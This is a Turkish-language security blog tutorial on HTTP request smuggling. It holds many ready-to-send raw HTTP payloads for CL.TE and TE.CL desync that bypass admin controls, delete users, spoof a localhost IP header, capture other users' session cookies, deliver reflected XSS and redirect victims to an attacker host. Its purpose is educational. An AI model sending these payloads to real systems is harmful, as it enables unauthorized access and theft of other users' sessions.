---
layout: post
section-type: post
title: TR - HTTP Request Smuggling
category: Web
tags: [ 'Web', 'Security' ]
---

HTTP istek kaçakçılığı olarak Türkçe'ye çevirebileceğimiz HTTP Request Smuggling açığı, sunucuda kullanılan front-end ve back-end sistemlerinin senkronize bir şekilde çalışmamasından kaynaklanır. Günümüzde çoğu sunucu zincirleme bir sisteme sahip. Bu zincirleme sistemlerin birbiri ile optimize bir şekilde çalışması için özenle yapılandırmak gerek. Ancak her ne kadar dikkat edilmeye çalışılsa da bazen gözden kaçan noktalar olabiliyor. HTTP Request Smuggling de bu noktalardan birisi.

Bu açığı incelemeye geçmeden önce istek yapısını bilmeliyiz. Örneğin benim sitemin anasayfasına girmek istediğinizde tarayıcınız aşağıdakine benzer bir istek gönderecektir:

        GET / HTTP/1.1
        Host: fatihfurkan.site
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1

Kısa bir şekilde hemen isteğimizi inceleyelim. İlk satırda isteğimizin HTTP GET metodunu kullandığınız anlıyoruz. Eğer HTTP metodlarını bilmiyorsanız öğrenmelisiniz. [Buraya][metodlar] bir kaynak bıraktım. GET metodumuzun yanında gördüğümüz "/" işareti, sitenin kök dizinini görüntülemek istediğimizi ifade eder. İlk satırın sonundaki "HTTP/1.1" ise, kullandığımız HTTP versiyonunu gösterir. Diğer ifadeleri ise kısaca açıklamak gerekirse:

        GET / HTTP/1.1
        Host: Hedef site
        User-Agent: Tarayıcınız ve bilgiyasarınız hakkında bilgi
        Accept: Kabul edilecek dosya türleri
        Accept-Language: Tercih edilen doğal dil kümesi
        Accept-Encoding: Kabul edilebilir içerik kodları
        DNT: Do Not Track (0 kapalı, 1 açık)
        Connection: Bağlantı türü
        Upgrade-Insecure-Requests: Şifrelenmiş ve kimliği doğrulanmış yanıtlar için

Herhangi bir girdi göndermediğimizde giden yanıtlar aşağı yukarı bu biçimdedir. Girdi gönderdiğimizde ise bunlara ek olarak 'Content-Length' veya 'Transfer-Encoding' ifadeleri kullanılır. Content-Length’de standart olarak isteğin içerisinde bulunan verinin boyutu byte cinsinden belirtilir. Transfer-Encoding‘de ise istek yapısının türünü belirtir (biz bu konuda sadece chunked türü ile ilgileneceğiz). Aşağıda CL ve TE için ayrı ayrı istek örnekleri görüyorsunuz:

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11

          q=smuggling

Burada verimizin boyutu CL'de 11 olarak belirtilmiş ve verimizi tek tek sayarsak gerçekten öyle olduğu görülür. Dikkat etmemiz gereken nokta, aradaki boşluğun sayılmayacak olması. O boşluk sadece header'ı ayırmak için kullanılıyor. Yani asıl verimiz "q=smuggling"dir. Şimdi bu isteğin TE versiyonunu inceleyelim:

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Transfer-Encoding: chunked

          b
          q=smuggling
          0

Verimizin türü TE'de chunked olarak belirtilmiş ve header'ı ayıran boşluktan sonra gördüğümüz ilk şey "b" harfi. Hexadecimal sayı sisteminde "b" nin temsil attığı sayı, onluk (bizim kullandığımız) sayı sisteminde 11'i temsil eder. Yani yine "q=smuggling" verisinin büyüklüğünü byte cinsinden elde ettik. Verimizin hemen altında ise, sıfırı görüyoruz. Sıfır chunked yapısında isteğimizin sona erdiğini belirtiyor.

Temel bilgileri aldıktan sonra hadi biraz daha eğlenceli kısımlara geçelim.

## HTTP Request Smuggling Açığı bulma

Öncelikle, bu aşama sistemden sisteme değişir. Çünkü kimileri CL.TE çalışırken, kimisi TE.CL çalışır. Tabii CL.CL ve TE.TE çalışan sistemler bu açığa karşı korumalıdır.

### 1) CL.TE Sistemler

Şimdi, hedef sistemimizin front-end'de CL, front-end'de TE kullandığını varsayalım. Sisteme giden normal bir istek şuna benzer olur:

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11

          q=smuggling

#### a) Zaman Bazlı Açık Tespiti

Şimdi bu isteği HTTP Request Smuggling açığını zaman bazlı tespite göre modifiye edelim.

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11
          Transfer-Encoding: chunked

          0

          G

Bu isteği siteye gönderdiğimizde; front-end'de hata vermeden back-end'e geçerek, back-end'de işlenecektir. İsteği alan back-end TE'e bakıp isteğin chunked olduğunu düşünecek ve ona göre hareket ederek sıfırda o isteğin bittiğini varsayacak. Daha sonra G'yi bir sonraki isteğin başına eklemeye çalışacaktır. Buradaki açığı farkettiniz mi? Back-end sıfırdan sonraki kısımları da işlemeye çalışıyor. Yani bir sonraki istek içeriği şu şekilde olacaktır:

          GPOST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 22

          q=Bu_sıradan_bir_istek

Yazdığımız G bir sonraki POST isteğinin başına geldi. Sunucu bu durumda timeout olana kadar yanıt veremeyecek, biz de burada bir HTTP Request Smuggling açığı olduğunu öğreneceğiz.

#### b) Farklı İsteklerle Açık Tespiti

Peki biz G yerine başka bir şey yazsak ne olur? Mesela başka bir istek yazalım;

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11
          Transfer-Encoding: chunked

          0

          GET / HTTP/1.1
          Host: fatihfurkan.site

Back-end burada GET metoduyla yazdığımız isteği, kendisine gelecek bir sonraki isteğin başına ekler. Yani başka normal bir istek geldiğinde aşağıdakine benzer bir şey ortaya çıkaracak;

          GET / HTTP/1.1
          Host: fatihfurkan.sitePOST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11
          Transfer-Encoding: chunked

          0

Böyle bir istekte URL anlamlı olmadığından dolayı 404 HTTP hata kodu alacağız. Hata aldığımız için de sunucunun HTTP Request Smuggling açığına zaaflı olduğunu öğreneceğiz.


### 2) TE.CL Sistemler

Şimdi, hedef sistemimiz front-end'de TE, front-end'de CL kullandığını varsayalım. Sisteme giden normal bir istek şuna benzer olur:

          POST /search HTTP/1.1
          Host: normal-website.com
          Content-Type: application/x-www-form-urlencoded
          Transfer-Encoding: chunked

          b
          q=smuggling
          0

#### a) Zaman Bazlı Açık Tespiti

Sunucuya şöyle bir istek atarsak:

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Transfer-Encoding: chunked
          Content-Length: 6

          0

          X

Front-end TE kullandığı için sıfıra kadar olan kısımı görecek, sıfırda isteğin bittiğini düşünecektir. Back-end ise CL'de 6 sayısını gördüğü için isteğin geri kalanına da bakacaktır. Bu işlem gözle görülür bir gecikmeye sebebiyet verirse, sistem bahsi geçen açığa karşı zaaflıdır.

NOT: Eğer sistem CL.TE açığına zaaflı ise TE.CL denemelerimiz sunucuyla iletişim halindeki diğer kullanıcıları da etkileyebileyebilir. Bu yüzden TE.CL'den önce CL.TE açığı araması yapmamız daha sağlıklı olacaktır.


#### b) Farklı İstek Bazlı Açık Tespiti

Eğer sunucuya aşağıdaki gibi bir istek gönderirsek;

          POST /search HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 2
          Transfer-Encoding: chunked

          7c
          GET /404 HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 144

          x=
          0

Front-end TE ile çalıştığı için sıfıra kadar olan kısmı işleyecektir. Ancak back-end CL ile çalığından ötürü içeriği 4 byte olarak görecek ve sadece 2 bytelık kısmı işleyecektir. Gönderdiğimiz istekteki 2 bytedan sonra gelenler, bir sonraki isteğin başına eklenecektir. Bir sonraki istek şu şekilde algılar;

          GET /404 HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 146

          x=
          0

          POST /search HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 11

          q=smuggling

Bu istek geçersiz bir URL içerdiğinden ötürü 404 hatası alarak, hedefin HTTP Request Smuggling açığına karşı zaaflı olduğunu öğreniriz.

Şimdi bu yazının en eğlenceli kısma geçiyoruz.

## HTTP Request Smuggling Açığını Sömürme

Bu bölümde, amaca ve uygulamanın diğer davranışlarına bağlı olarak HTTP Request Smuggling güvenlik açıklarından yararlanılabilecek çeşitli yollar açıklayacağım. Aksi belirtilmediği sürece bütün sistemler CL.TE olarak kullanıldığı varsayılmıştır.

### Front-end Güvenlik Kontrollerini Atlatmak İçin HTTP Request Smuggling Kullanımı

Bazı sistemler front-end'de güvenlik kontrolleri yapar. Yalnızca bu kontrollerden geçen istekler back-end'e iletilir.

Örneğin, bir sistemde belirli URL'lere sadece kullanıcının yetkisi varsa ulaşılabilir olsun. Front-end isteği kontrol ediyor ve kontrolden geçenleri back-end'e iletiyor. Back-end ise, kendisine ulaşan istekleri güvenilir kabul ederek direkt işliyor. Bu durumda HTTP Request Smuggling kullanılarak front-end güvenlik kontrolleri atlatılabilir.

Bir kullanıcının sistemde /home'a erişiminin olduğunu ancak /admin'e olmadığını varsayalım. Bu kısıtlama aşağıdaki gibi bir istek ile atlatılabilir:

          POST /home HTTP/1.1
          Host: vulnerable-website.com        
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 60
          Transfer-Encoding: chunked

          0

          GET /admin HTTP/1.1
          Host: vulnerable-website.com

Yukarıdaki gibi bir durumda olduğumuzu düşünelim. Admin paneline "erişim sağlayabiliyoruz". Hadi oradan "fatih" kullanıcı adına sahip kullanıcıyı silmeye çalışalım.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 37
          Transfer-Encoding: chunked

          0

          GET /admin HTTP/1.1
          X-Ignore: X

İsteğini gönderdiğimizde gelen yanıtta 403 Forbidden hatasını görürüz. Bunun sebebi ikinci isteğimizde localhost'u belirtmemiş olmamızdı. Hadi localhost'u belirtelim.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 54
          Transfer-Encoding: chunked

          0

          GET /admin HTTP/1.1
          Host: localhost
          X-Ignore: X

Bu isteği gönderdiğimizde de hata alacağız. Bunun sebebi, isteklerdeki host bilgileri birbiri ile çakışıyor olması.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 116
          Transfer-Encoding: chunked

          0

          GET /admin HTTP/1.1
          Host: localhost
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 10

          x=


Ve panele ulaştık. Şimdi biraz brute-force saldırısı veya "iyi" tahminlerle kullanıcıyı silelim.


          POST /home HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 139
          Transfer-Encoding: chunked

          0

          GET /admin/delete?username=fatih HTTP/1.1
          Host: localhost
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 10

          x=

Başarı ile kullanıcımızı sildik. Bu örnek bir CL.TE örneğiydi. TE.CL'de ise aşağıdaki gibi bir örnek kullanılabilir.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-length: 4
          Transfer-Encoding: chunked

          87
          GET /admin/delete?username=carlos HTTP/1.1
          Host: localhost
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 15

          x=1
          0

### Front-end İsteğini Yeniden Yazma

Gönderdiğimiz istekler önce front-end'e iletilir. Front-end isteğimizi back-end'e iletmeden önce, isteğe bazı başlıklar ekler. Örneğin; TLS bağlantısı hakkında bazı bilgiler, kullanıcı IP'sini içeren X-Forwarded-For başlığı, kullanıcıyı tanımlayan oturum başlığı vb.

Bu açığı kullanabilmek için öncelikle, front-end'in eklediği başlıkları görebilmemiz gerekir. Bunun için aşağıdaki örneği takip edebilirsiniz. Örneğimizde, sunucu CL.TE şeklinde çalışıyor ve sunucunun /admin dizinine sadece 127.0.0.1 IP'si (localhost) ile bağlanılabiliyor. İlk işimiz POST ile gönderilip, yanıtta da bulunan bir girdi bulmak. Bizim örneğimizde anasayfada arama girdisi var- istekte parametre ismi search olarak gözüküyor. Mesela test sözcüğünü arattığımızda, yanıtta "<h1>1 search results for 'test'</h1>" şeklinde beliriyor. Şimdi, şöyle bir istek atalım:

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 124
          Transfer-Encoding: chunked

          0

          POST / HTTP/1.1
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 200
          Connection: close

          search=test


Dikkat edin, searh parametresini en sona yazdık. Gelen yanıtı inceleyelim.

          "<h1>0 search results for 'test POST / HTTP/1.1
          X-bEByYY-Ip: xxx.xxx.xxx.xxx
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 125
          Transfe'</h1>"

Bizim gönderdiğimiz istekte "X-bEByYY-Ip" yoktu. Peki bu nereden geldi? Evet, doğru cevap, front-end ekledi. Front-end, isteği gönderenin IP'sini X-bEByYY-Ip başlığı ile back-end'e gösteriyor. Asıl olaya geliyoruz. Back-end, istek yapanın IP'si 127.0.0.1 olmadıkça /admin'i
yasaklıyor, ama biz back-end'e ulaşan IP'yi değiştirebiliriz değil mi? Çünkü, back-end'in hangi başlık ile IP kontrolü yaptığını biliyoruz. Hadi o zaman yeni isteğimizi gönderelim.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 124
          Transfer-Encoding: chunked

          0

          POST /admin HTTP/1.1
          X-bEByYY-Ip: 127.0.0.1
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 200
          Connection: close

          x=1

Ve ikinci isteğimizin sonucunda /admin dizinine ulaştık. Buradan sonra sizin hayal gücünüze kalmış.

NOT: Yeniden yazılan isteği görmek için gönderdiğimiz isteğin içerisindeki Content-Length, bize dönecek yanıtın büyüklüğünü gösterir. Eğer çok küçük bir sayı girersek, yanıtın bir kısmı görünmeyecek, dönecek yanıtın uzunluğundan büyük bir sayı girersek back-end sunucusu time out yaşayacaktır.

### Diğer Kullanıcıların İsteğini Yakalama

Eğer uygulamanın herhangi bir text verisi alma ve depolama işlevi varsa, HTTP Request Smuggling ile kullanıcı bilgileri çalınabilir. Bu bilgiler arasında; session, cookie, e-posta, şifre gibi siteye gönderilmeye çalışılan her şey olabilir.  

Bir siteye aşağıdakine benzer bir istek göndererek yorum atıldığını varsayalım.

          POST /post/comment HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 154
          Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

          csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net

Bu sitede aşağıdaki gibi bir istek ile kaçakçılık yapabiliriz.

          GET / HTTP/1.1
          Host: vulnerable-website.com
          Transfer-Encoding: chunked
          Content-Length: 324

          0

          POST /post/comment HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 400
          Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

          csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=fatih&email=mail%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=merhaba

Back-end, başka bir kullanıcının isteğini ne zaman işlerse, bizim kaçak isteğimizin sonuna kullanıcının isteğini ekler.

          POST /post/comment HTTP/1.1
          Host: vulnerable-website.com
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 400
          Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

          csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=fatih&email=mail%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=merhabaGET / HTTP/1.1
          Host: vulnerable-website.com
          Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
          ...

Bu şekilde kullanıcının bazı hassas bilgilerine ulaşabilirsiniz. Fakat şöyle bir kısıtlama var, kaçak istek tipine göre (bizim durumumuzda url-encoded), parametre ayırıcısına kadar gösterim gerçekleşir (bizim durumumuzda bu ayırıcı &).

### Reflected XSS Açığını Kullanma

Eğer bir sistemde hem HTTP Request Smuggling hem de Reflected XSS açığı varsa; uygulamanın diğer kullancılarını etkilemek için bir istek kaçakçılığı saldırısı kullanabiliriz. Reflected XSS'i HTTP Request Smuggling'le kullanmanın, sadece Reflected XSS kullanmaya karşı iki üstünlüğü vardır; birincisi, kurban avlamanız gerekmez. Siz sadece XSS payloadını sisteme gönderir ve başka bir kullanıcının sunucuya istek atıp, saldırınızdan etkilenmesini beklersiniz. İkincisi, HTTP istek başlıkları gibi normal bir Reflected XSS saldırısında, isteğe bağlı olarak kontrol edilemeyen bölümlerde XSS davranışından yararlanmak için kullanılabilir.

Örneğin; bir uygulamanın User-Agent başlığının Reflected XSS'e karşı zaaflı olduğunu düşünelim. Aşağıdaki  istekle, bir sonraki kullanıcının ekranına "1" yazısını alert şeklinde yansıtabiliriz.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Length: 63
          Transfer-Encoding: chunked

          0

          GET / HTTP/1.1
          User-Agent: <script>alert(1)</script>
          Foo: X


### Normal Bir Yönlendirmeyi Open Redirect Olarak Kullanmak

Bir çok web uygulaması yönlendirme işlemini kullanır. Hatta bazı uygulamalar için vazgeçilmezlerdir. Normal bir şekilde uygulamanın /home dizinine erişmek istediğini belirten bir istek ve aldığı normal yanıtı görüyorsunuz.

          GET /home HTTP/1.1
          Host: normal-website.com

          HTTP/1.1 301 Moved Permanently
          Location: https://normal-website.com/home/

Kişi GET metodu ile normal-website sitesinin /home dizinine erişmek istediğini belirtmiş. Yanıt olarak da 301 yönlendirme kodunu alarak, istediği yer, kişiye gönderilmiş. Hadi burada da zaafiyet tespiti yapalım.

          POST / HTTP/1.1
          Host: vulnerable-website.com
          Content-Length: 54
          Transfer-Encoding: chunked

          0

          GET /home HTTP/1.1
          Host: attacker-website.com
          Foo: X

Kaçak istek, attacker-websitesi'ne yönlendirme içerir. Bu yönlendirmeden bir sonraki kullanıcı etkilenecektir. Örneğin;

          GET /home HTTP/1.1
          Host: attacker-website.com
          Foo: XGET /scripts/include.js HTTP/1.1
          Host: vulnerable-website.com

          HTTP/1.1 301 Moved Permanently
          Location: https://attacker-website.com/home/

Burada, kullanıcı sitenin /scripts dizininde bulunan include.js JavaScript dosyasına ulaşmak istemiş. Ancak saldırganın daha önceden kaçırdığı istek yüzünden, kullanıcının isteği yerine saldırganın yönlendirmesi çalışıyor. Saldırgan yaptığı bu yönlendirme ile, kendi sitesine yazdığı JavaScript kodlarını kurbanın bilgisayarında çalıştırabilir.


[comment]: <> (İki saldırı yöntemi daha eklenecek (web cache poisoning, web cache deception)


## Özet

Bu yazıda, sizlere HTTP Request Smuggling açığından bahsettim. Teknoloji sürekli gelişiyor, bu yüzden benim burada bahsetmediğim açık tespit yöntemleri ve sömürme yöntemleri olabilir. Daha fazlası için her zaman araştırmanız sizi sürekli daha ileri seviyelere götürecektir. Güncel kalmanız dileğiyle...

**Fatih Furkan Hatipoğlu**

&nbsp;

Bana bu kadar bilgi yetmez, daha fazlasını istiyorum diyenler için birkaç tavsiye kaynak:

[metodlar]: https://www.w3schools.com/tags/ref_httpmethods.asp

[PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)

[PortSwigger - HTTP Request Smuggling açığı bulma](https://portswigger.net/web-security/request-smuggling/finding)

[PortSwigger - HTTP Request Smuggling açığını exploitleme](https://portswigger.net/web-security/request-smuggling/finding)
